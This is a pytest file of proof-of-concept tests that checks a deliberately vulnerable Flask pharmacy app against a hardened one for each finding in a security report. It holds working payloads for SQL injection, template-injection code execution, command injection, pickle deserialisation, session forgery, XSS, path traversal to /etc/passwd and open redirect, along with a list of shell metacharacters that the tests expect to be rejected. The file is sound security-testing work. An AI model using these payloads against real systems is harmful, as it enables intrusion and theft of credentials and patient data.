"""One proof-of-concept per finding in REPORT.md.

Each test runs against both apps and asserts ``exploited == target.vulnerable``:
the attack must succeed on vulnerable/ and be blocked on secure/.
"""

import hashlib
import io
import json
import logging
import pickle

from flask import Flask
from flask.sessions import SecureCookieSessionInterface


def logged_in_as(target, user):
    with target.client.session_transaction() as s:
        return s.get("user_id") == {"admin": 1, "alice": 2, "bob": 3}[user]


# ---- V-01 SQL injection --------------------------------------------------------


def test_v01_sqli_login_bypass(target):
    target.login("admin' --", "anything")
    assert logged_in_as(target, "admin") == target.vulnerable


def test_v01_sqli_union_dumps_password_hashes(target):
    payload = "zzz' UNION SELECT username, password, role FROM users --"
    body = target.client.get("/search", query_string={"q": payload}).get_data(as_text=True)
    admin_md5 = hashlib.md5(b"admin123").hexdigest()
    exploited = admin_md5 in body
    assert exploited == target.vulnerable
    if not target.vulnerable:
        assert "<li>" not in body  # the payload is treated as a search term, matching nothing


# ---- V-02 Server-side template injection -> remote code execution --------------


def test_v02_ssti_evaluates_expressions(target):
    body = target.client.get("/search", query_string={"q": "{{7*191}}"}).get_data(as_text=True)
    assert ("1337" in body) == target.vulnerable


def test_v02_ssti_runs_os_commands(target):
    payload = '{{ cycler.__init__.__globals__.os.popen("echo SSTI-$((6*7))").read() }}'
    body = target.client.get("/search", query_string={"q": payload}).get_data(as_text=True)
    assert ("SSTI-42" in body) == target.vulnerable


# ---- V-03 OS command injection ---------------------------------------------------


def test_v03_command_injection_in_ping(target):
    target.login("admin")
    resp = target.client.get("/admin/ping", query_string={"host": "127.0.0.1; echo INJ$((40+2))"})
    exploited = "INJ42" in resp.get_data(as_text=True)
    assert exploited == target.vulnerable
    if not target.vulnerable:
        assert resp.status_code == 400


def test_v03_secure_ping_still_accepts_valid_hosts(target):
    if target.vulnerable:
        return
    target.login("admin")
    assert target.client.get("/admin/ping", query_string={"host": "127.0.0.1"}).status_code == 200
    for bad in ("-f", "a b", "$(id)", "x;id", "`id`", "a|b"):
        assert target.client.get("/admin/ping", query_string={"host": bad}).status_code == 400


# ---- V-04 Insecure deserialisation (pickle) ------------------------------------


def test_v04_pickle_upload_executes_code(target, tmp_path):
    marker = tmp_path / "pwned.txt"

    class Exploit:
        def __reduce__(self):
            # Runs on unpickling; returns [] so the import loop finishes cleanly.
            return (eval, (f"__import__('pathlib').Path({str(marker)!r}).write_text('x') and []",))

    target.login("admin")
    target.post(
        "/admin/import",
        {"backup": (io.BytesIO(pickle.dumps(Exploit())), "backup.pkl")},
        page="/messages",
        content_type="multipart/form-data",
    )
    assert marker.exists() == target.vulnerable


def test_v04_secure_import_accepts_valid_json_only(target):
    if target.vulnerable:
        return
    target.login("admin")

    def upload(data):
        return target.post(
            "/admin/import", {"backup": (io.BytesIO(data), "b.json")},
            page="/messages", content_type="multipart/form-data",
        )

    good = json.dumps([{"name": "Ibuprofen 200mg", "stock": 10, "price": 3000}]).encode()
    assert upload(good).status_code == 200
    assert target.query("SELECT 1 FROM medicines WHERE name = 'Ibuprofen 200mg'")
    assert upload(b'[{"name": "x", "stock": -1, "price": 1}]').status_code == 400
    assert upload(b'{"not": "a list"}').status_code == 400


# ---- V-05 Hard-coded secret key -> forged admin session ------------------------


def forge_session(data, key):
    app = Flask("forger")
    app.secret_key = key
    return SecureCookieSessionInterface().get_signing_serializer(app).dumps(data)


def test_v05_forged_session_cookie_grants_admin(target):
    # The attacker only has the source code, so only the key printed in it.
    cookie = forge_session({"user": "admin", "user_id": 1, "role": "admin"}, "meditrack-dev-key")
    target.client.set_cookie("session", cookie)
    assert (target.client.get("/admin/messages").status_code == 200) == target.vulnerable


def test_v05_role_in_session_is_not_trusted(target):
    # Even with a validly signed cookie, a patient cannot promote themselves.
    target.login("alice")
    with target.client.session_transaction() as s:
        s["role"] = "admin"
    assert (target.client.get("/admin/messages").status_code == 200) == target.vulnerable


def test_v05_secure_app_refuses_to_start_without_secret(target, monkeypatch):
    if target.vulnerable:
        return
    from secure.app import create_app

    monkeypatch.delenv("MEDITRACK_SECRET_KEY", raising=False)
    try:
        create_app({"DATABASE": target.db_path})
    except RuntimeError:
        return
    raise AssertionError("app started without a secret key")


# ---- V-06 Cross-site scripting -------------------------------------------------


def test_v06_reflected_xss_in_search(target):
    body = target.client.get(
        "/search", query_string={"q": "<script>alert(1)</script>"}
    ).get_data(as_text=True)
    assert ("<script>alert(1)</script>" in body) == target.vulnerable


def test_v06_stored_xss_in_admin_inbox(target):
    payload = "<img src=x onerror=alert(document.cookie)>"
    target.login("alice")
    target.post("/messages", {"body": payload})
    target.client.get("/logout") if target.vulnerable else target.post("/logout", {}, page="/")
    target.login("admin")
    body = target.client.get("/admin/messages").get_data(as_text=True)
    assert (payload in body) == target.vulnerable
    if not target.vulnerable:
        assert "&lt;img src=x onerror=alert(document.cookie)&gt;" in body


# ---- V-07 Insecure direct object reference ------------------------------------


def test_v07_patient_reads_another_patients_prescription(target):
    target.login("alice")  # alice owns prescription 1; prescription 2 is bob's
    assert target.client.get("/prescriptions/1").status_code == 200
    resp = target.client.get("/prescriptions/2")
    assert ("HbA1c" in resp.get_data(as_text=True)) == target.vulnerable


# ---- V-08 Path traversal --------------------------------------------------------


def test_v08_path_traversal_reads_source_code(target):
    target.login("alice")
    for name in ("../app.py", "/etc/passwd"):
        resp = target.client.get("/reports/download", query_string={"file": name})
        leaked = resp.status_code == 200 and (b"def " in resp.data or b"root:" in resp.data)
        assert leaked == target.vulnerable


def test_v08_legitimate_report_download_still_works(target):
    target.login("alice")
    resp = target.client.get("/reports/download", query_string={"file": "stock-2026-10.txt"})
    assert resp.status_code == 200 and b"stock report" in resp.data


# ---- V-09 Weak password hashing -------------------------------------------------


def test_v09_passwords_stored_as_unsalted_md5(target):
    (stored,) = target.query("SELECT password FROM users WHERE username = 'alice'")[0]
    is_md5 = stored == hashlib.md5(target.password("alice").encode()).hexdigest()
    assert is_md5 == target.vulnerable
    if not target.vulnerable:
        assert stored.startswith("scrypt:")


# ---- V-10 Default admin credentials -------------------------------------------


def test_v10_default_admin_password(target):
    target.login("admin", "admin123")
    assert logged_in_as(target, "admin") == target.vulnerable


# ---- V-11 Cross-site request forgery ------------------------------------------


def test_v11_post_without_csrf_token_is_accepted(target):
    target.login("alice")
    # What a hostile page's auto-submitting form sends: the cookie, but no token.
    resp = target.client.post("/messages", data={"body": "sent by evil.example"})
    stored = bool(target.query("SELECT 1 FROM messages WHERE body = 'sent by evil.example'"))
    assert stored == target.vulnerable
    if not target.vulnerable:
        assert resp.status_code == 400


# ---- V-12 Open redirect ---------------------------------------------------------


def test_v12_open_redirect_after_login(target):
    for evil in ("https://evil.example/login", "//evil.example", "/\\evil.example"):
        resp = target.login("alice", next_url=evil)
        assert ("evil.example" in resp.headers.get("Location", "")) == target.vulnerable
        target.client.delete_cookie("session")


def test_v12_local_next_is_kept(target):
    resp = target.login("alice", next_url="/prescriptions/1")
    assert resp.headers["Location"].endswith("/prescriptions/1")


# ---- V-13 Passwords in logs ------------------------------------------------------


def test_v13_password_written_to_log(target, caplog):
    with caplog.at_level(logging.INFO, logger="meditrack"):
        target.login("alice")
    assert (target.password("alice") in caplog.text) == target.vulnerable


# ---- V-14 No brute-force protection / missing hardening ------------------------


def test_v14_unlimited_password_guessing(target):
    for i in range(10):
        target.login("alice", f"wrong-guess-{i}")
    resp = target.login("alice")  # the 11th guess is the right one
    assert logged_in_as(target, "alice") == target.vulnerable
    if not target.vulnerable:
        assert resp.status_code == 429


def test_v14_security_headers_and_cookie_flags(target):
    target.login("alice")
    resp = target.client.get("/")
    has_headers = all(
        h in resp.headers
        for h in ("Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options")
    )
    assert has_headers != target.vulnerable
    cookie = target.client.get_cookie("session")
    assert (cookie.http_only and cookie.same_site == "Lax") != target.vulnerable


# ---- V-16 Username enumeration -------------------------------------------------


def test_v16_login_error_reveals_valid_usernames(target):
    known = target.login("alice", "wrong").get_data(as_text=True)
    unknown = target.login("nobody", "wrong").get_data(as_text=True)
    assert (known != unknown) == target.vulnerable


# ---- normal use still works -----------------------------------------------------


def test_normal_search(target):
    body = target.client.get("/search", query_string={"q": "amox"}).get_data(as_text=True)
    assert "Amoxicillin 250mg" in body and "Coartem" not in body
